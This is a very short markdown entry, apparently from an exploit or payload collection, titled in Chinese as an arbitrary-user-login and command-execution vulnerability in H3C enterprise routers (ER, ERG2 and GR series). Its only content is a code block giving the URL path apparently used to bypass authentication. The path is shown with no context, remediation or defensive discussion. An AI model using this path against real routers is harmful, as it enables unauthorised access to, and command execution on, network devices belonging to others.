## H3C企业路由器(ER、ERG2、GR系列)任意用户登录/命令执行

```
/userLogin.asp/actionpolicy_status/
```
